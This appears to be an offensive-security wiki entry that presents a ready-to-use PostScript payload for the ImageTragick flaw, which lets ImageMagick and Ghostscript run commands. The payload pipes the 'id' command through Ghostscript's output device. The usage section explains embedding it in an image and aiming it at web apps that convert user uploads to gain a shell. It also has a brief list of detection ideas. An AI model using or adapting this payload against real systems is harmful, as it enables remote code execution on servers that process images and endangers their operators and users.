---
type: code
language: PostScript
verified: true
created_at: '2023-04-06T03:56:40Z'
updated_at: '2023-04-06T03:56:41Z'
platforms:
  - Linux
  - Unix
tags:
  - payload
  - rce
  - postscript
  - imagemagick
validated: true
---

# PostScript-Payload-to-Execute-ID-via-ImageMagick

## Code

```postscript
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

## Description

This PostScript snippet is a payload designed for ImageTragick exploits in ImageMagick. When embedded in an image and processed (e.g., during conversion), it leverages the PostScript delegate (via Ghostscript) to execute system commands. The '%pipe%id' configures output to pipe the 'id' command, demonstrating RCE by retrieving the current user's identity. It manipulates device properties to trigger execution without direct userdict overrides.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| %pipe%id | Placeholder for the command to execute (e.g., pipe output of 'id') | %pipe%id (executes 'id' command) |

## Usage

Embed this exact code into a JPEG or other image format using a hex editor or crafting tool, then trigger processing with ImageMagick's 'convert'. Ideal for web apps that resize or convert user-uploaded images. Test on a local vulnerable setup before targeting. Used in procedures like [[procedures/ImageTragick-Exploit-for-RCE-via-Crafted-Image-Conversion]] to gain initial shell access.

## Detection

- Monitor Ghostscript (gs) processes spawning from ImageMagick with unusual arguments.
- Log file accesses to /tmp or pipe creations involving 'id' or similar commands.
- ImageMagick policy violations or delegate errors in application logs.
- Anomalous system calls (e.g., execve of 'id') from image processing contexts.

## Related

- [[procedures/ImageTragick-Exploit-for-RCE-via-Crafted-Image-Conversion]]
- [[commands/imagemagick-convert-trigger-exploit]]
